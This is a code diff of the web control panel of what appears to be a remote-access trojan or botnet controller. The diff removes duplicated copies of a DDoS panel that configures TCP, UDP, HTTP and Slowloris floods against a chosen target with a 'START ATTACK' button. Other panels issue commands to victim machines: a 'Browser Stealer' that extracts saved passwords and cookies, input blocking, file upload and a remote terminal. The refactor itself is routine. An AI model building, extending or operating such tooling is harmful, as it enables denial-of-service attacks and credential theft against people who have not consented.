-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📊 Total Data</div>
-                    <div class="stat-value" id="ddos-data" style="color:var(--accent-purple);">0 MB</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⏱️ Duration</div>
-                    <div class="stat-value" id="ddos-duration" style="color:var(--text-primary);">00:00</div>
-                </div>
-            </div>
-
-            <!-- Log -->
-            <div class="stat-card" style="flex:1;display:flex;flex-direction:column;min-height:0;">
-                <div class="stat-title">📋 Attack Log</div>
-                <div id="ddos-log" style="flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:12px;line-height:1.6;color:var(--accent-green);background:#0a0a0a;padding:10px;border-radius:var(--radius-sm);min-height:0;">
-                    <div style="color:var(--text-muted);text-align:center;padding:20px;">Configure target and start attack</div>
-                </div>
-            </div>
         </div>
     </div>
-
-</div>
 
     <!-- NETWORK -->
     <div id="network-panel" class="panel">
@@ -885,83 +360,8 @@
                 <div class="stat-title">🔗 Active Connections (Top 100)</div>
                 <div id="net-connections" style="font-size:12px;color:var(--text-secondary);max-height:400px;overflow-y:auto;">Click Refresh</div>
             </div>
-            </div>
-
-    <!-- DDOS -->
-    <div id="ddos-panel" class="panel">
-        <div style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:16px;">
-            <!-- Configuration -->
-            <div class="stat-card">
-                <div class="stat-title">🎯 Target Configuration</div>
-                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Target IP / Host</label>
-                        <input id="ddos-target" placeholder="192.168.1.1 or example.com" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Port</label>
-                        <input id="ddos-port" type="number" value="80" min="1" max="65535" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                </div>
-
-                <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Threads</label>
-                        <input id="ddos-threads" type="number" value="50" min="1" max="500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Packet Size (bytes)</label>
-                        <input id="ddos-pkt-size" type="number" value="1024" min="64" max="65500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Method</label>
-                        <select id="ddos-method" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;">
-                            <option value="tcp">TCP Flood</option>
-                            <option value="udp">UDP Flood</option>
-                            <option value="http">HTTP Flood</option>
-                            <option value="slowloris">Slowloris</option>
-                        </select>
-                    </div>
-                </div>
-
-                <div style="display:flex;gap:8px;margin-top:12px;align-items:flex-end;">
-                    <button id="ddos-toggle-btn" class="btn-danger-lg" onclick="toggleDdos()" style="flex:1;">
-                        🔥 START ATTACK
-                    </button>
-                </div>
-            </div>
-
-            <!-- Stats Cards -->
-            <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(180px, 1fr));gap:12px;">
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📤 Packets Sent</div>
-                    <div class="stat-value" id="ddos-packets" style="color:var(--accent-orange);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⚡ Packets/sec</div>
-                    <div class="stat-value" id="ddos-pps" style="color:var(--accent-cyan);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📊 Total Data</div>
-                    <div class="stat-value" id="ddos-data" style="color:var(--accent-purple);">0 MB</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⏱️ Duration</div>
-                    <div class="stat-value" id="ddos-duration" style="color:var(--text-primary);">00:00</div>
-                </div>
-            </div>
-
-            <!-- Log -->
-            <div class="stat-card" style="flex:1;display:flex;flex-direction:column;min-height:0;">
-                <div class="stat-title">📋 Attack Log</div>
-                <div id="ddos-log" style="flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:12px;line-height:1.6;color:var(--accent-green);background:#0a0a0a;padding:10px;border-radius:var(--radius-sm);min-height:0;">
-                    <div style="color:var(--text-muted);text-align:center;padding:20px;">Configure target and start attack</div>
-                </div>
-            </div>
         </div>
     </div>
-
-</div>
 
     <!-- NETWORK MAP -->
     <div id="map-panel" class="panel">
@@ -992,83 +392,8 @@
             <span style="font-size:11px;color:var(--text-muted);" id="map-status">Auto-refreshes when panel opens</span>
             <span style="flex:1;"></span>
             <span style="font-size:11px;color:var(--accent-green);" id="map-device-count">No devices scanned</span>
-            </div>
-
-    <!-- DDOS -->
-    <div id="ddos-panel" class="panel">
-        <div style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:16px;">
-            <!-- Configuration -->
-            <div class="stat-card">
-                <div class="stat-title">🎯 Target Configuration</div>
-                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Target IP / Host</label>
-                        <input id="ddos-target" placeholder="192.168.1.1 or example.com" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Port</label>
-                        <input id="ddos-port" type="number" value="80" min="1" max="65535" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                </div>
-
-                <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Threads</label>
-                        <input id="ddos-threads" type="number" value="50" min="1" max="500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Packet Size (bytes)</label>
-                        <input id="ddos-pkt-size" type="number" value="1024" min="64" max="65500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Method</label>
-                        <select id="ddos-method" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;">
-                            <option value="tcp">TCP Flood</option>
-                            <option value="udp">UDP Flood</option>
-                            <option value="http">HTTP Flood</option>
-                            <option value="slowloris">Slowloris</option>
-                        </select>
-                    </div>
-                </div>
-
-                <div style="display:flex;gap:8px;margin-top:12px;align-items:flex-end;">
-                    <button id="ddos-toggle-btn" class="btn-danger-lg" onclick="toggleDdos()" style="flex:1;">
-                        🔥 START ATTACK
-                    </button>
-                </div>
-            </div>
-
-            <!-- Stats Cards -->
-            <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(180px, 1fr));gap:12px;">
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📤 Packets Sent</div>
-                    <div class="stat-value" id="ddos-packets" style="color:var(--accent-orange);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⚡ Packets/sec</div>
-                    <div class="stat-value" id="ddos-pps" style="color:var(--accent-cyan);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📊 Total Data</div>
-                    <div class="stat-value" id="ddos-data" style="color:var(--accent-purple);">0 MB</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⏱️ Duration</div>
-                    <div class="stat-value" id="ddos-duration" style="color:var(--text-primary);">00:00</div>
-                </div>
-            </div>
-
-            <!-- Log -->
-            <div class="stat-card" style="flex:1;display:flex;flex-direction:column;min-height:0;">
-                <div class="stat-title">📋 Attack Log</div>
-                <div id="ddos-log" style="flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:12px;line-height:1.6;color:var(--accent-green);background:#0a0a0a;padding:10px;border-radius:var(--radius-sm);min-height:0;">
-                    <div style="color:var(--text-muted);text-align:center;padding:20px;">Configure target and start attack</div>
-                </div>
-            </div>
         </div>
     </div>
-
-</div>
 
     <!-- FUN COMMANDS -->
     <div id="fun-panel" class="panel">
@@ -1084,83 +409,8 @@
             <div class="stat-card"><div class="stat-title">🔊 Sound</div><button class="btn-sm" onclick="emitToClient('play_sound',{freq:800,dur:1})" style="width:100%;margin:6px 0;">Beep</button><button class="btn-sm" onclick="emitToClient('play_sound',{freq:1200,dur:2})" style="width:100%;">Long Beep</button></div>
             <div class="stat-card"><div class="stat-title">🔒 Input Block</div><p style="font-size:11px;color:var(--text-muted);margin:6px 0;">Block mouse & keyboard (needs admin)</p><button class="btn-sm" onclick="emitToClient('input_block')" style="width:100%;margin:4px 0;border-color:var(--accent-red);color:var(--accent-red);">🔒 Block Input</button><button class="btn-sm" onclick="emitToClient('input_unblock')" style="width:100%;">🔓 Unblock Input</button></div>
             <div class="stat-card"><div class="stat-title">🔑 Browser Stealer</div><p style="font-size:11px;color:var(--text-muted);margin:6px 0;">Extract passwords & cookies (Chrome/Edge/Firefox)</p><button class="btn-sm" onclick="emitToClient('browser_steal')" style="width:100%;margin:4px 0;border-color:var(--accent-orange);color:var(--accent-orange);">🔓 Steal Now</button><div id="browser-result" style="font-size:11px;max-height:300px;overflow-y:auto;margin-top:6px;color:var(--text-secondary);"></div></div>
-            </div>
-
-    <!-- DDOS -->
-    <div id="ddos-panel" class="panel">
-        <div style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:16px;">
-            <!-- Configuration -->
-            <div class="stat-card">
-                <div class="stat-title">🎯 Target Configuration</div>
-                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Target IP / Host</label>
-                        <input id="ddos-target" placeholder="192.168.1.1 or example.com" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Port</label>
-                        <input id="ddos-port" type="number" value="80" min="1" max="65535" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                </div>
-
-                <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Threads</label>
-                        <input id="ddos-threads" type="number" value="50" min="1" max="500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Packet Size (bytes)</label>
-                        <input id="ddos-pkt-size" type="number" value="1024" min="64" max="65500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Method</label>
-                        <select id="ddos-method" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;">
-                            <option value="tcp">TCP Flood</option>
-                            <option value="udp">UDP Flood</option>
-                            <option value="http">HTTP Flood</option>
-                            <option value="slowloris">Slowloris</option>
-                        </select>
-                    </div>
-                </div>
-
-                <div style="display:flex;gap:8px;margin-top:12px;align-items:flex-end;">
-                    <button id="ddos-toggle-btn" class="btn-danger-lg" onclick="toggleDdos()" style="flex:1;">
-                        🔥 START ATTACK
-                    </button>
-                </div>
-            </div>
-
-            <!-- Stats Cards -->
-            <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(180px, 1fr));gap:12px;">
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📤 Packets Sent</div>
-                    <div class="stat-value" id="ddos-packets" style="color:var(--accent-orange);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⚡ Packets/sec</div>
-                    <div class="stat-value" id="ddos-pps" style="color:var(--accent-cyan);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📊 Total Data</div>
-                    <div class="stat-value" id="ddos-data" style="color:var(--accent-purple);">0 MB</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⏱️ Duration</div>
-                    <div class="stat-value" id="ddos-duration" style="color:var(--text-primary);">00:00</div>
-                </div>
-            </div>
-
-            <!-- Log -->
-            <div class="stat-card" style="flex:1;display:flex;flex-direction:column;min-height:0;">
-                <div class="stat-title">📋 Attack Log</div>
-                <div id="ddos-log" style="flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:12px;line-height:1.6;color:var(--accent-green);background:#0a0a0a;padding:10px;border-radius:var(--radius-sm);min-height:0;">
-                    <div style="color:var(--text-muted);text-align:center;padding:20px;">Configure target and start attack</div>
-                </div>
-            </div>
         </div>
     </div>
-
-</div>
 
     <!-- FILES -->
     <div id="files-panel" class="panel">
@@ -1183,83 +433,8 @@
             <button onclick="document.getElementById('file-upload-input').click()">📤 Upload</button>
             <input type="file" id="file-upload-input" style="display:none;" onchange="fileUpload(this)">
         </div>
-        <div id="files-table">    </div>
-
-    <!-- DDOS -->
-    <div id="ddos-panel" class="panel">
-        <div style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:16px;">
-            <!-- Configuration -->
-            <div class="stat-card">
-                <div class="stat-title">🎯 Target Configuration</div>
-                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Target IP / Host</label>
-                        <input id="ddos-target" placeholder="192.168.1.1 or example.com" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Port</label>
-                        <input id="ddos-port" type="number" value="80" min="1" max="65535" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                </div>
-
-                <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Threads</label>
-                        <input id="ddos-threads" type="number" value="50" min="1" max="500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Packet Size (bytes)</label>
-                        <input id="ddos-pkt-size" type="number" value="1024" min="64" max="65500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Method</label>
-                        <select id="ddos-method" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;">
-                            <option value="tcp">TCP Flood</option>
-                            <option value="udp">UDP Flood</option>
-                            <option value="http">HTTP Flood</option>
-                            <option value="slowloris">Slowloris</option>
-                        </select>
-                    </div>
-                </div>
-
-                <div style="display:flex;gap:8px;margin-top:12px;align-items:flex-end;">
-                    <button id="ddos-toggle-btn" class="btn-danger-lg" onclick="toggleDdos()" style="flex:1;">
-                        🔥 START ATTACK
-                    </button>
-                </div>
-            </div>
-
-            <!-- Stats Cards -->
-            <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(180px, 1fr));gap:12px;">
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📤 Packets Sent</div>
-                    <div class="stat-value" id="ddos-packets" style="color:var(--accent-orange);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⚡ Packets/sec</div>
-                    <div class="stat-value" id="ddos-pps" style="color:var(--accent-cyan);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📊 Total Data</div>
-                    <div class="stat-value" id="ddos-data" style="color:var(--accent-purple);">0 MB</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⏱️ Duration</div>
-                    <div class="stat-value" id="ddos-duration" style="color:var(--text-primary);">00:00</div>
-                </div>
-            </div>
-
-            <!-- Log -->
-            <div class="stat-card" style="flex:1;display:flex;flex-direction:column;min-height:0;">
-                <div class="stat-title">📋 Attack Log</div>
-                <div id="ddos-log" style="flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:12px;line-height:1.6;color:var(--accent-green);background:#0a0a0a;padding:10px;border-radius:var(--radius-sm);min-height:0;">
-                    <div style="color:var(--text-muted);text-align:center;padding:20px;">Configure target and start attack</div>
-                </div>
-            </div>
-        </div>
+        <div id="files-table"></div>
     </div>
-
-</div>
 
     <!-- TERMINAL -->
     <div id="terminal-panel" class="panel">
@@ -1271,83 +446,8 @@
         <div id="terminal-input-row">
             <span class="prompt">$</span>
             <input type="text" id="terminal-input" placeholder="Type command..." onkeydown="terminalKeydown(event)">
-            </div>
-
-    <!-- DDOS -->
-    <div id="ddos-panel" class="panel">
-        <div style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:16px;">
-            <!-- Configuration -->
-            <div class="stat-card">
-                <div class="stat-title">🎯 Target Configuration</div>
-                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Target IP / Host</label>
-                        <input id="ddos-target" placeholder="192.168.1.1 or example.com" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Port</label>
-                        <input id="ddos-port" type="number" value="80" min="1" max="65535" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                </div>
-
-                <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Threads</label>
-                        <input id="ddos-threads" type="number" value="50" min="1" max="500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Packet Size (bytes)</label>
-                        <input id="ddos-pkt-size" type="number" value="1024" min="64" max="65500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Method</label>
-                        <select id="ddos-method" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;">
-                            <option value="tcp">TCP Flood</option>
-                            <option value="udp">UDP Flood</option>
-                            <option value="http">HTTP Flood</option>
-                            <option value="slowloris">Slowloris</option>
-                        </select>
-                    </div>
-                </div>
-
-                <div style="display:flex;gap:8px;margin-top:12px;align-items:flex-end;">
-                    <button id="ddos-toggle-btn" class="btn-danger-lg" onclick="toggleDdos()" style="flex:1;">
-                        🔥 START ATTACK
-                    </button>
-                </div>
-            </div>
-
-            <!-- Stats Cards -->
-            <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(180px, 1fr));gap:12px;">
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📤 Packets Sent</div>
-                    <div class="stat-value" id="ddos-packets" style="color:var(--accent-orange);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⚡ Packets/sec</div>
-                    <div class="stat-value" id="ddos-pps" style="color:var(--accent-cyan);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📊 Total Data</div>
-                    <div class="stat-value" id="ddos-data" style="color:var(--accent-purple);">0 MB</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⏱️ Duration</div>
-                    <div class="stat-value" id="ddos-duration" style="color:var(--text-primary);">00:00</div>
-                </div>
-            </div>
-
-            <!-- Log -->
-            <div class="stat-card" style="flex:1;display:flex;flex-direction:column;min-height:0;">
-                <div class="stat-title">📋 Attack Log</div>
-                <div id="ddos-log" style="flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:12px;line-height:1.6;color:var(--accent-green);background:#0a0a0a;padding:10px;border-radius:var(--radius-sm);min-height:0;">
-                    <div style="color:var(--text-muted);text-align:center;padding:20px;">Configure target and start attack</div>
-                </div>
-            </div>
         </div>
     </div>
-
-</div>
 
     <!-- STATS -->
     <div id="stats-panel" class="panel">
@@ -1386,12 +486,12 @@
                 <thead><tr><th>PID</th><th>Name</th><th>CPU%</th><th>Mem%</th><th>Action</th></tr></thead>
                 <tbody id="processes-tbody"></tbody>
             </table>
-            </div>
+        </div>
+    </div>
 
     <!-- DDOS -->
     <div id="ddos-panel" class="panel">
         <div style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:16px;">
-            <!-- Configuration -->
             <div class="stat-card">
                 <div class="stat-title">🎯 Target Configuration</div>
                 <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
@@ -1404,7 +504,6 @@
                         <input id="ddos-port" type="number" value="80" min="1" max="65535" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
                     </div>
                 </div>
-
                 <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:12px;">
                     <div>
                         <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Threads</label>
@@ -1424,15 +523,12 @@
                         </select>
                     </div>
                 </div>
-
                 <div style="display:flex;gap:8px;margin-top:12px;align-items:flex-end;">
                     <button id="ddos-toggle-btn" class="btn-danger-lg" onclick="toggleDdos()" style="flex:1;">
                         🔥 START ATTACK
                     </button>
                 </div>
             </div>
-
-            <!-- Stats Cards -->
             <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(180px, 1fr));gap:12px;">
                 <div class="stat-card ddos-stat-card">
                     <div class="stat-title">📤 Packets Sent</div>
@@ -1451,18 +547,15 @@
                     <div class="stat-value" id="ddos-duration" style="color:var(--text-primary);">00:00</div>
                 </div>
             </div>
-
-            <!-- Log -->
             <div class="stat-card" style="flex:1;display:flex;flex-direction:column;min-height:0;">
                 <div class="stat-title">📋 Attack Log</div>
                 <div id="ddos-log" style="flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:12px;line-height:1.6;color:var(--accent-green);background:#0a0a0a;padding:10px;border-radius:var(--radius-sm);min-height:0;">
-                    <div style="color:var(--text-muted);text-align:center;padding:20px;">Configure target and start attack</div>
+                    <div id="ddos-log-placeholder" style="color:var(--text-muted);text-align:center;padding:20px;">Configure target and start attack</div>
                 </div>
             </div>
         </div>
     </div>
 
-</div>
 </div>
 
 <div id="toast-container"></div>
@@ -2168,8 +1261,8 @@
 
     function ddosLog(msg, type) {
         const log = document.getElementById('ddos-log');
-        const ph = log.querySelector('div');
-        if (ph && ph.textContent.includes('Configure')) ph.remove();
+        const ph = document.getElementById('ddos-log-placeholder');
+        if (ph) ph.remove();
         const entry = document.createElement('div');
         entry.className = 'log-entry ' + (type || '');
         const ts = new Date().toLocaleTimeString();
